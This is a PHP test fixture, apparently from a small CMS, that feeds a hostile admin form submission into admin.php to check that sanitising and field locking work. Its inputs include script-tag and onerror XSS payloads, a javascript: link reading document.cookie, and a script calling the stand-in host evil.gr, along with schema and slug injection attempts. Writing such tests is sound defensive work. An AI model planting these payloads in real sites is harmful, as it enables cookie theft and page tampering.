<?php
/**
 * Runs one admin save in an isolated process, with a hostile $_POST.
 * Used by 03_lockdown.php — not a test itself.
 */

declare(strict_types=1);

session_start();
$_SESSION['csrf'] = 'test-token';

putenv('AUTH_DEV_BYPASS=1');
$_SERVER['REQUEST_METHOD']  = 'POST';

$_POST = [
    'action' => 'save',
    'csrf'   => 'test-token',
    'page'   => 'home',
    // Correct baseline: this save is legitimate in every way except its payload.
    'baseline' => hash_file('sha256', dirname(__DIR__) . '/content/pages/home.yml'),
    'title'  => '  Αρχική   σελίδα  <b>bold</b> ',

    'blocks' => [
        'hero' => [
            // legitimate edit
            'subheading' => "Νέος υπότιτλος από τον πελάτη.",

            // 1. XSS attempt in a plain text field
            'heading'    => 'Καλημέρα <script>alert(1)</script><img src=x onerror=alert(2)>',

            // 2. hostile URL in a link field
            'cta_url'    => 'javascript:alert(document.cookie)',

            // 3. locked field — must be ignored even though it is posted
            'align'      => 'start',

            // 4. field that does not exist in schema.yml
            'evil'       => 'should never be written',

            // 5. attempt to retype the component
            'type'       => 'contact_cta',
        ],

        'intro' => [
            // 6. richtext: script/style/attribute/link laundering
            'body' => '<p onclick="steal()">Κείμενο <strong>έντονο</strong>'
                    . '<script>fetch("//evil.gr")</script>'
                    . '<style>body{display:none}</style>'
                    . '<a href="javascript:alert(1)">κακός</a> '
                    . '<a href="https://example.gr">καλός</a></p>'
                    . '<font face="Comic Sans">word paste</font><p>&nbsp;</p>',
        ],

        // 7. a block id that is not in the page file at all
        'injected_block' => [
            'heading' => 'I should not exist',
        ],
    ],

    // 8. structural fields that are not the client's to change
    'slug'  => '/hacked',
    'id'    => 'hacked',
];

require dirname(__DIR__) . '/public/admin.php';
